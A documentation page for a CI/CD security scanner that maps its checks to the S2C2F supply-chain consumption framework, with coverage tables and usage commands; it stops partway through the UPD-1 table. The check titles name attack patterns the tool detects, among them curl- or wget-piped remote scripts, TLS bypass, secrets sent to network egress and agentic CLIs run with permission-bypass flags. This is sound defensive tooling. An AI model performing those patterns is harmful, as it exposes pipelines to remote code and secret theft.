# Secure Supply Chain Consumption Framework

- **Version:** 2024
- **URL:** <https://github.com/ossf/s2c2f>
- **Source of truth:** `pipeline_check/core/standards/data/s2c2f.py`

Microsoft / OpenSSF Secure Supply Chain Consumption Framework.
Ingest, inventory, scan, rebuild, fix, the consumer-side controls
for taking a third-party dependency safely.

## At a glance

- **Controls in this standard:** 11
- **Controls evidenced by at least one check:** 11 / 11
- **Distinct checks evidencing this standard:** 206
- **Of those, autofixable with `--fix`:** 41

_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._

## Coverage by control

Click a control ID to jump to the per-control section with the full check list. The severity mix column shows the spread of evidencing checks by severity (`C`ritical / `H`igh / `M`edium / `L`ow / `I`nfo).

| Control | Title | Checks | Severity mix |
|---------|-------|-------:|--------------|
| [`ING-1`](#ctrl-ing-1) | L1: Use package managers trusted by your organization | 47 | 1C · 35H · 10M · 1L |
| [`ING-3`](#ctrl-ing-3) | L1: Have the capability to deny-list specific vulnerable / malicious OSS | 11 | 5C · 3H · 3M |
| [`SCA-1`](#ctrl-sca-1) | L1: Scan OSS for known vulnerabilities | 12 | 1H · 11M |
| [`SCA-3`](#ctrl-sca-3) | L2: Scan OSS for malware | 20 | 13C · 1H · 6M |
| [`UPD-1`](#ctrl-upd-1) | L1: Update vulnerable OSS manually (pin + track versions) | 57 | 33H · 19M · 5L |
| [`UPD-2`](#ctrl-upd-2) | L3: Enable automated OSS updates (Dependabot / Renovate) | 6 | 6M |
| [`ENF-1`](#ctrl-enf-1) | L2: Enforce security policy of OSS usage (block on violation) | 13 | 3H · 10M |
| [`ENF-2`](#ctrl-enf-2) | L2: Break the build when a violation is detected | 4 | 1H · 3M |
| [`REB-2`](#ctrl-reb-2) | L4: Digitally sign rebuilt / produced OSS artifacts | 16 | 2H · 14M |
| [`REB-3`](#ctrl-reb-3) | L4: Generate SBOMs for artifacts produced | 20 | 1H · 12M · 7L |
| [`REB-4`](#ctrl-reb-4) | L4: Digitally sign SBOMs produced (attested provenance) | 14 | 4H · 10M |

## Filter at runtime

Restrict a scan to checks that evidence this standard with `--standard s2c2f`:

```bash
# All providers, only checks tied to this standard
pipeline_check --standard s2c2f

# Compose with --pipeline to scope by provider
pipeline_check --pipeline github --standard s2c2f

# Compose with another standard to widen the lens
pipeline_check --pipeline aws --standard s2c2f --standard owasp_cicd_top_10
```

## Controls in scope

### ING-1: L1: Use package managers trusted by your organization { #ctrl-ing-1 }

**Evidenced by 47 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, PyPI, Tekton, maven, npm).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-018`](#detail-ado-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-023`](#detail-ado-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-028`](#detail-ado-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-014`](#detail-bb-014) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-023`](#detail-bb-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-027`](#detail-bb-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-008`](#detail-bk-008) | TLS verification disabled in step command | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CA-002`](#detail-ca-002) | CodeArtifact repository has a public external connection | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-018`](#detail-cc-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-028`](#detail-cc-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-021`](#detail-df-021) | RUN pip install bypasses TLS or uses an HTTP index | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-022`](#detail-df-022) | RUN uses npm install instead of npm ci | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-024`](#detail-df-024) | RUN npm/yarn/pnpm install runs lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-026`](#detail-df-026) | ENV disables Node.js TLS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-027`](#detail-df-027) | ENV disables Python HTTPS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-028`](#detail-df-028) | ENV disables Git TLS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-029`](#detail-df-029) | ENV neuters Python requests CA bundle | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-006`](#detail-dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-011`](#detail-gcb-011) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-016`](#detail-gha-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-017`](#detail-gha-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-018`](#detail-gha-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-029`](#detail-gha-029) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-018`](#detail-gl-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-023`](#detail-gl-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-027`](#detail-gl-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-001`](#detail-helm-001) | Chart.yaml declares legacy apiVersion: v1 | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-003`](#detail-helm-003) | Chart dependency declared on a non-HTTPS repository | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-009`](#detail-helm-009) | Chart home / sources URL uses a non-HTTPS scheme | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-018`](#detail-jf-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-023`](#detail-jf-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-031`](#detail-jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-035`](#detail-jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`MVN-003`](#detail-mvn-003) | pom.xml declares a plaintext-HTTP Maven repository | <span class="pg-sev pg-sev--high">HIGH</span> | [maven](../providers/maven.md) |  |
| [`MVN-007`](#detail-mvn-007) | settings.xml mirror routes external traffic through one repo | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`NPM-003`](#detail-npm-003) | package-lock.json entry resolves from a non-registry source | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
| [`NPM-004`](#detail-npm-004) | package.json declares an install-time lifecycle script | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
| [`NPM-007`](#detail-npm-007) | .npmrc does not disable install-time lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
| [`PYPI-003`](#detail-pypi-003) | requirements.txt uses an HTTP index or disables TLS verification | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
| [`PYPI-005`](#detail-pypi-005) | requirements.txt declares --extra-index-url (dependency-confusion surface) | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### ING-3: L1: Have the capability to deny-list specific vulnerable / malicious OSS { #ctrl-ing-3 }

**Evidenced by 11 checks** across 5 providers (AWS, GitHub Actions, PyPI, maven, npm).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CA-002`](#detail-ca-002) | CodeArtifact repository has a public external connection | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-041`](#detail-gha-041) | Action upstream repo has a single contributor | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-042`](#detail-gha-042) | Action upstream repo is newly created | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-043`](#detail-gha-043) | Low-star action runs with sensitive permissions | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-047`](#detail-gha-047) | Action ref resolves to a recently committed tag or SHA | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-056`](#detail-gha-056) | Workflow body contains a known supply-chain worm indicator | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`MVN-006`](#detail-mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [maven](../providers/maven.md) |  |
| [`NPM-006`](#detail-npm-006) | package-lock.json pins a known-compromised package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [npm](../providers/npm.md) |  |
| [`PYPI-006`](#detail-pypi-006) | requirements.txt pins a known-compromised PyPI package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [PyPI](../providers/pypi.md) |  |

### SCA-1: L1: Scan OSS for known vulnerabilities { #ctrl-sca-1 }

**Evidenced by 12 checks** across 11 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-020`](#detail-ado-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-012`](#detail-argo-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-015`](#detail-bb-015) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-007`](#detail-ecr-007) | Inspector v2 enhanced scanning disabled for ECR | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-008`](#detail-gcb-008) | No vulnerability scanning step in Cloud Build pipeline | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-020`](#detail-gha-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-019`](#detail-gl-019) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-020`](#detail-jf-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`TKN-012`](#detail-tkn-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### SCA-3: L2: Scan OSS for malware { #ctrl-sca-3 }

**Evidenced by 20 checks** across 10 providers (AWS, Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins, PyPI, maven, npm).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-026`](#detail-ado-026) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-025`](#detail-bb-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-030`](#detail-bb-030) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-031`](#detail-bb-031) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CB-011`](#detail-cb-011) | CodeBuild buildspec contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-026`](#detail-cc-026) | Config contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) |  |
| [`GHA-027`](#detail-gha-027) | Workflow contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-056`](#detail-gha-056) | Workflow body contains a known supply-chain worm indicator | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-057`](#detail-gha-057) | Secret-scanner output sent to network egress | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-058`](#detail-gha-058) | Agentic CLI invoked with permission-bypass flags | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-059`](#detail-gha-059) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-060`](#detail-gha-060) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-025`](#detail-gl-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-034`](#detail-gl-034) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-035`](#detail-gl-035) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`MVN-006`](#detail-mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [maven](../providers/maven.md) |  |
| [`NPM-006`](#detail-npm-006) | package-lock.json pins a known-compromised package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [npm](../providers/npm.md) |  |
| [`PYPI-006`](#detail-pypi-006) | requirements.txt pins a known-compromised PyPI package version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [PyPI](../providers/pypi.md) |  |

### UPD-1: L1: Update vulnerable OSS manually (pin + track versions) { #ctrl-upd-1 }

**Evidenced by 57 checks** across 18 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, PyPI, Tekton, maven, npm).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-009`](#detail-ado-009) | Container image pinned by tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-021`](#detail-ado-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-025`](#detail-ado-025) | Cross-repo template not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-001`](#detail-argo-001) | Argo template container image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-021`](#detail-bb-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-029`](#detail-bb-029) | image: (step or service) not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-001`](#detail-bk-001) | Buildkite plugin not pinned to an exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CB-009`](#detail-cb-009) | CodeBuild image not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-021`](#detail-cc-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-029`](#detail-cc-029) | Machine executor image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-010`](#detail-df-010) | apt-get dist-upgrade / upgrade pulls unknown package versions | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-011`](#detail-df-011) | Package manager install without cache cleanup in same layer | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-022`](#detail-df-022) | RUN uses npm install instead of npm ci | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-001`](#detail-dr-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-005`](#detail-dr-005) | Plugin step uses a floating image tag | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-008`](#detail-dr-008) | Step uses ``pull: never`` (skips registry verification) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-021`](#detail-gha-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-023`](#detail-gha-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-025`](#detail-gha-025) | Reusable workflow not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-051`](#detail-gha-051) | services / container image is not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-009`](#detail-gl-009) | Image pinned to version tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-021`](#detail-gl-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-028`](#detail-gl-028) | services: image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-030`](#detail-gl-030) | trigger: include: pulls child pipeline without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-004`](#detail-helm-004) | Chart dependency version is a range, not an exact pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`HELM-008`](#detail-helm-008) | Chart.lock generated more than 90 days ago | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`JF-001`](#detail-jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-009`](#detail-jf-009) | Agent docker image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-021`](#detail-jf-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`MVN-001`](#detail-mvn-001) | pom.xml dependency uses a floating version range | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`MVN-002`](#detail-mvn-002) | pom.xml depends on a mutable SNAPSHOT version | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`MVN-004`](#detail-mvn-004) | pom.xml dependency omits an explicit ``<version>`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`MVN-005`](#detail-mvn-005) | Maven repository accepts artifacts without strict checksum gating | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`NPM-001`](#detail-npm-001) | package.json dependency uses a floating version range | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [npm](../providers/npm.md) |  |
| [`NPM-002`](#detail-npm-002) | package-lock.json entry missing integrity hash | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
